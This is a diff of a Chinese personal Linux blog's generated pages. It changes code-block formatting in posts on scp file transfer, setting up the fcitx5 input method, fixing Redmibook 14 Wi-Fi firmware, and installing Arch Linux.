+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上面已经提示过很多次&lt;strong&gt;这个&lt;code&gt;[文件名]&lt;/code&gt;是个路径了&lt;/strong&gt;。这里就不再多废话啦。&lt;/p&gt;
 &lt;p&gt;嗯&amp;hellip; 具体就是这样子的：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;weepingdogel@WeepingDogel ~&amp;gt; scp -P 45820 root@cn-zj-dx-2.sakurafrp.com:/root/test.py /tmp/test.py
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;但是这里我来个组合命令&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;weepingdogel@WeepingDogel ~ [1]&amp;gt; scp -P 45820 root@cn-zj-dx-2.sakurafrp.com:/root/test.py /tmp/test.py &amp;amp;&amp;amp; cd /tmp &amp;amp;&amp;amp; python test.py
-The authenticity of host &#39;[cn-zj-dx-2.sakurafrp.com]:45820 ([222.186.174.33]:45820)&#39; can&#39;t be established.
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;weepingdogel@WeepingDogel ~&amp;gt; scp -P 45820 root@cn-zj-dx-2.sakurafrp.com:/root/test.py /tmp/test.py
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;但是这里我来个组合命令&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;weepingdogel@WeepingDogel ~ [1]&amp;gt; scp -P 45820 root@cn-zj-dx-2.sakurafrp.com:/root/test.py /tmp/test.py &amp;amp;&amp;amp; cd /tmp &amp;amp;&amp;amp; python test.py
+The authenticity of host &amp;#39;[cn-zj-dx-2.sakurafrp.com]:45820 ([222.186.174.33]:45820)&amp;#39; can&amp;#39;t be established.
 ECDSA key fingerprint is SHA256:8J1Z+I8NtPXAk7EFDwLiwu8pmwSoPLYeJM2iYnV7z5M.
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added &#39;[cn-zj-dx-2.sakurafrp.com]:45820,[222.186.174.33]:45820&#39; (ECDSA) to the list of known hosts.
-root@cn-zj-dx-2.sakurafrp.com&#39;s password: 
+Warning: Permanently added &amp;#39;[cn-zj-dx-2.sakurafrp.com]:45820,[222.186.174.33]:45820&amp;#39; (ECDSA) to the list of known hosts.
+root@cn-zj-dx-2.sakurafrp.com&amp;#39;s password: 
 test.py                                                      100%   21     0.2KB/s   00:00    
 Hello World
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;上传的也是差不多的啦，把位置反过来就可以了，这里就不多演示啦&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上传的也是差不多的啦，把位置反过来就可以了，这里就不多演示啦&lt;/p&gt;
 &lt;p&gt;写完啦！&lt;/p&gt;
 &lt;h2 id=&#34;参考链接&#34;&gt;参考链接&lt;/h2&gt;
 &lt;p&gt;啥？这次没有，自己试出来的&amp;hellip;&lt;/p&gt;
@@ -526,10 +951,10 @@ Hello World
 &lt;blockquote&gt;
 &lt;p&gt;（PS：你可能用的不是谷歌输入法，所以请把 &lt;code&gt;fcitx-googlepinyin&lt;/code&gt; 改成你装的输入法的包名）&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;pre&gt;&lt;code&gt;sudo pacman -Rs fcitx-configtool fcitx-googlepinyin fcitx-qt5 fcitx
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;接下来，将这个文件删除，反正也没用了 (逃&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;$ sudo rm -rf ./.pam_environment
-&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;安装-fcitx5&#34;&gt;安装 fcitx5&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;sudo pacman -Rs fcitx-configtool fcitx-googlepinyin fcitx-qt5 fcitx
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;接下来，将这个文件删除，反正也没用了 (逃&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;$ sudo rm -rf ./.pam_environment
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;安装-fcitx5&#34;&gt;安装 fcitx5&lt;/h3&gt;
 &lt;p&gt;现在来安装 fcitx5，这样子弄&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;
@@ -562,10 +987,10 @@ Hello World
 &lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;那么，执行&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;$ sudo pacman -S fcitx5 fcitx5-chinese-addons fcitx5-im fcitx5-configtool
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;软件包安装完成后，理论上它是会开机启动的，但是嘛，也有可能出点玄学问题，先手动做一下这个&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;$ sudo cp /usr/share/applications/fcitx5.desktop ~/.config/autostart/ -v
-&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;环境变量&#34;&gt;环境变量&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;$ sudo pacman -S fcitx5 fcitx5-chinese-addons fcitx5-im fcitx5-configtool
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;软件包安装完成后，理论上它是会开机启动的，但是嘛，也有可能出点玄学问题，先手动做一下这个&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;$ sudo cp /usr/share/applications/fcitx5.desktop ~/.config/autostart/ -v
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;环境变量&#34;&gt;环境变量&lt;/h3&gt;
 &lt;p&gt;嗯哼，最后就是设置环境变量了，既然 &lt;code&gt;.pam_environment&lt;/code&gt; 不能用了，那要写在哪里呢？&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;https://blog.lilydjwg.me/2020/7/22/linux-environment-variables.215496.html&#34;&gt;云云&lt;/a&gt;说：&lt;/p&gt;
 &lt;blockquote&gt;
@@ -573,17 +998,17 @@ Hello World
 &lt;/blockquote&gt;
 &lt;p&gt;也就是说，我们需要把 fcitx5 的环境变量写在 &lt;code&gt;.xprofile&lt;/code&gt; 这个文件里面&lt;/p&gt;
 &lt;p&gt;然后&amp;hellip;&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;$ vim ./.xprofile
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在里面写入这些东西&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;$ vim ./.xprofile
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在里面写入这些东西&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;export INPUT_METHOD&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;fcitx5
 export GTK_IM_MODULE&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;fcitx5
 export QT_IM_MODULE&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;fcitx5
 export XMODIFIERS&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;@im&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;fcitx5
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;接下来你可以选择重启 &lt;code&gt;lightdm&lt;/code&gt; ，&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;$ sudo systemctl restart lightdm
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;或者重启系统&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;$ sudo reboot
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;此时，xfce 的状态栏出现了一个键盘，但是按 &lt;!-- raw HTML omitted --&gt;&lt;code&gt;CTRL&lt;/code&gt;&lt;!-- raw HTML omitted --&gt; + &lt;!-- raw HTML omitted --&gt;&lt;code&gt;SPACE&lt;/code&gt;&lt;!-- raw HTML omitted --&gt; 无法弹出中文输入法，这下怎么办呢？&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;$ sudo systemctl restart lightdm
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;或者重启系统&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;$ sudo reboot
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;此时，xfce 的状态栏出现了一个键盘，但是按 &lt;!-- raw HTML omitted --&gt;&lt;code&gt;CTRL&lt;/code&gt;&lt;!-- raw HTML omitted --&gt; + &lt;!-- raw HTML omitted --&gt;&lt;code&gt;SPACE&lt;/code&gt;&lt;!-- raw HTML omitted --&gt; 无法弹出中文输入法，这下怎么办呢？&lt;/p&gt;
 &lt;p&gt;直接右键那个键盘图标，点击配置，然后进入内个 QT 写的配置工具里添加中文输入法就可以啦～～！&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/2020-07-25_15-52.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;只需要双击就可以添加到左边哦～&lt;/p&gt;
@@ -627,42 +1052,42 @@ export XMODIFIERS&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;@im&lt;
 &lt;p&gt;&lt;strong&gt;打开终端, 执行&lt;/strong&gt;&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ol&gt;
-&lt;pre&gt;&lt;code&gt;$ sudo ip link
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后它会返回这样的东西, 如图&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;$ sudo ip link
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后它会返回这样的东西, 如图&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/2020-07-17_11-16.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;设置网卡&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;$ sudo ip link set enp3s0f4u2 up
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;运行 &lt;code&gt;dhcpcd&lt;/code&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;$ sudo dhcpcd
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;接下来, 我试着运行 &lt;code&gt;ifconfig&lt;/code&gt;, 可是不能用, 但是看了一眼 &lt;code&gt;network manager&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;$ sudo ip link set enp3s0f4u2 up
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;运行 &lt;code&gt;dhcpcd&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;$ sudo dhcpcd
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;接下来, 我试着运行 &lt;code&gt;ifconfig&lt;/code&gt;, 可是不能用, 但是看了一眼 &lt;code&gt;network manager&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;嗯 能上网了&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/photo_2020-07-16_23-31-07.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;h2 id=&#34;解决过程&#34;&gt;解决过程&lt;/h2&gt;
 &lt;h3 id=&#34;软件源&#34;&gt;软件源&lt;/h3&gt;
 &lt;p&gt;我们会进行软件包的装卸, 所以我们首先需要做的是选择合适的软件源&amp;hellip;.&lt;/p&gt;
 &lt;p&gt;ok, 现在我们需要修改的文件是这个&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;/etc/pacman.d/mirrorlist
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我们用 &lt;code&gt;nano&lt;/code&gt; 改, 记得加 &lt;code&gt;sudo&lt;/code&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;$ sudo nano /etc/pacman.d/mirrorlist
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;将 &lt;code&gt;# China&lt;/code&gt; 下面的内容 放到第一行&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;/etc/pacman.d/mirrorlist
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我们用 &lt;code&gt;nano&lt;/code&gt; 改, 记得加 &lt;code&gt;sudo&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;$ sudo nano /etc/pacman.d/mirrorlist
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;将 &lt;code&gt;# China&lt;/code&gt; 下面的内容 放到第一行&lt;/p&gt;
 &lt;p&gt;至于 &lt;code&gt;nano&lt;/code&gt; 的用法, 请自行查找资料, 会用记事本就会用这个&lt;/p&gt;
 &lt;p&gt;修改完后, 如图&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/photo_2020-07-16_23-48-54.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;然后执行&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;$ sudo pacman -Sy
-&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;安装-linux-firmware&#34;&gt;安装 &lt;code&gt;linux-firmware&lt;/code&gt;&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;$ sudo pacman -Sy
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;安装-linux-firmware&#34;&gt;安装 &lt;code&gt;linux-firmware&lt;/code&gt;&lt;/h3&gt;
 &lt;p&gt;执行&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;$ sudo pacman -S linux-firmware
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;重启之后, 发现还是无效, 此时我去谷歌查了一下.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;$ sudo pacman -S linux-firmware
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;重启之后, 发现还是无效, 此时我去谷歌查了一下.&lt;/p&gt;
 &lt;p&gt;发现, 我们需要手动从 &lt;a href=&#34;https://github.com/FireWalkerX/ath10k-firmware/tree/master/QCA6174/hw3.0&#34;&gt;Github&lt;/a&gt; 下载它的驱动文件&lt;/p&gt;
 &lt;h3 id=&#34;手动替换驱动文件&#34;&gt;手动替换驱动文件&lt;/h3&gt;
 &lt;p&gt;到上面那个链接指向的 Github 仓库, 下载 &lt;code&gt;board-2.bin&lt;/code&gt; 和 &lt;code&gt;firmware-4.bin_WLAN.RM.2.0-00180-QCARMSWPZ-1&lt;/code&gt;, 分别将它们重命名为: &lt;code&gt;board.bin&lt;/code&gt; 和 &lt;code&gt;firmware-4.bin&lt;/code&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;$ wget https://github.com/FireWalkerX/ath10k-firmware/raw/7e56cbb94182a2fdab110cf5bfeded8fd1d44d30/QCA6174/hw3.0/board-2.bin
-&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;$ wget https://github.com/FireWalkerX/ath10k-firmware/raw/7e56cbb94182a2fdab110cf5bfeded8fd1d44d30/QCA6174/hw3.0/firmware-4.bin_WLAN.RM.2.0-00180-QCARMSWPZ-1
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后把这两个文件复制到 &lt;code&gt;/lib/firmware/ath10k/QCA6174/hw3.0/&lt;/code&gt; 目录下&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;$ sudo cp board.bin /lib/firmware/ath10k/QCA6174/hw3.0/board.bin
-&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;$ sudo cp firmware-4.bin /lib/firmware/ath10k/QCA6174/hw3.0/firmware-4.bin
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后重启系统, WIFI 就能用了.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;$ wget https://github.com/FireWalkerX/ath10k-firmware/raw/7e56cbb94182a2fdab110cf5bfeded8fd1d44d30/QCA6174/hw3.0/board-2.bin
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;$ wget https://github.com/FireWalkerX/ath10k-firmware/raw/7e56cbb94182a2fdab110cf5bfeded8fd1d44d30/QCA6174/hw3.0/firmware-4.bin_WLAN.RM.2.0-00180-QCARMSWPZ-1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后把这两个文件复制到 &lt;code&gt;/lib/firmware/ath10k/QCA6174/hw3.0/&lt;/code&gt; 目录下&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;$ sudo cp board.bin /lib/firmware/ath10k/QCA6174/hw3.0/board.bin
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;$ sudo cp firmware-4.bin /lib/firmware/ath10k/QCA6174/hw3.0/firmware-4.bin
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后重启系统, WIFI 就能用了.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/photo_2020-07-19_23-12-18.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;h2 id=&#34;总结&#34;&gt;总结&lt;/h2&gt;
 &lt;p&gt;以上内容均为 Redmibook 14 的解决过程, 并不一定适用于其他设备, 因此仅供参考.&lt;/p&gt;
@@ -872,9 +1297,9 @@ export XMODIFIERS&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;@im&lt;
 &lt;h3 id=&#34;确认是否连接到网络&#34;&gt;确认是否连接到网络&lt;/h3&gt;
 &lt;p&gt;启动Arch ISO之后，你将操作一个运行在 tty 上的 Live CD，这个时候第一件事就是检查有没有连接到网络。&lt;/p&gt;
 &lt;p&gt;你可以使用 &lt;code&gt;ping&lt;/code&gt; 这个命令来确认是否连接到网络，随便一个非局域网地址都可以&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;# ping weepingdogel.github.io
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;若返回出类似这样的信息，则说明网络连接是正常的&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;PING weepingdogel.github.io (185.199.111.153) 56(84) bytes of data.
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;# ping weepingdogel.github.io
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;若返回出类似这样的信息，则说明网络连接是正常的&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;PING weepingdogel.github.io (185.199.111.153) 56(84) bytes of data.
 64 bytes from 185.199.111.153 (185.199.111.153): icmp_seq=2 ttl=48 time=113 ms
 64 bytes from 185.199.111.153 (185.199.111.153): icmp_seq=3 ttl=48 time=110 ms
 64 bytes from 185.199.111.153 (185.199.111.153): icmp_seq=4 ttl=48 time=114 ms
@@ -888,29 +1313,29 @@ export XMODIFIERS&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;@im&lt;
 --- weepingdogel.github.io ping statistics ---
 11 packets transmitted, 9 received, 18.1818% packet loss, time 10801ms
 rtt min/avg/max/mdev = 110.224/112.036/114.157/1.355 ms
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;如果返回的不是类似于上面的信息，那么你可能没有正确连接到网络，你需要这样做&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果返回的不是类似于上面的信息，那么你可能没有正确连接到网络，你需要这样做&lt;/p&gt;
 &lt;p&gt;检查网卡&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;# ip link
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;将会返回这些&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;1: lo: &amp;lt;LOOPBACK,UP,LOWER_UP&amp;gt; mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1000
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;# ip link
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;将会返回这些&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;1: lo: &amp;lt;LOOPBACK,UP,LOWER_UP&amp;gt; mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1000
     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
 2: enp3s0: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; mtu 1500 qdisc fq_codel state UP mode DEFAULT group default qlen 1000
     link/ether bc:5f:f4:aa:04:c9 brd ff:ff:ff:ff:ff:ff
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;lo&lt;/code&gt; 是指 localhost ，一般情况下，如果你只有一个网卡的话，类似于 &lt;code&gt;enp3s0&lt;/code&gt; 的名称就是你的网卡了，但不同品牌的网卡显示的也不同，如 Intel 网卡可能显示为 &lt;code&gt;ens33&lt;/code&gt; 之类的。下面用 &lt;code&gt;&amp;lt;网卡名&amp;gt;&lt;/code&gt; 来指代吧&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;lo&lt;/code&gt; 是指 localhost ，一般情况下，如果你只有一个网卡的话，类似于 &lt;code&gt;enp3s0&lt;/code&gt; 的名称就是你的网卡了，但不同品牌的网卡显示的也不同，如 Intel 网卡可能显示为 &lt;code&gt;ens33&lt;/code&gt; 之类的。下面用 &lt;code&gt;&amp;lt;网卡名&amp;gt;&lt;/code&gt; 来指代吧&lt;/p&gt;
 &lt;p&gt;设置网卡&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;# ip link set &amp;lt;网卡名&amp;gt; up
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;使用 &lt;code&gt;dhcpcd&lt;/code&gt; 命令来自动匹配 DHCP 地址&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;# dhcpcd
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;它会自动帮你获取到 DHCP 地址，然后你就能连接到网络了&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;# ip link set &amp;lt;网卡名&amp;gt; up
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;使用 &lt;code&gt;dhcpcd&lt;/code&gt; 命令来自动匹配 DHCP 地址&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;# dhcpcd
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;它会自动帮你获取到 DHCP 地址，然后你就能连接到网络了&lt;/p&gt;
 &lt;h3 id=&#34;同步系统时间&#34;&gt;同步系统时间&lt;/h3&gt;
 &lt;p&gt;你需要保证 Live CD 目前的时间是准确的&lt;/p&gt;
 &lt;p&gt;这里执行 &lt;code&gt;timedatectl&lt;/code&gt; 命令&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;# timedatectl set-ntp true
-&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;分区&#34;&gt;分区&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;# timedatectl set-ntp true
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;分区&#34;&gt;分区&lt;/h3&gt;
 &lt;p&gt;这里一直都是比较关键的部分，分区..&lt;/p&gt;
 &lt;p&gt;首先，你需要查看你的硬盘是否被识别&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;# fdisk -l
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里引入一个 &lt;strong&gt;块设备的概念&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;# fdisk -l
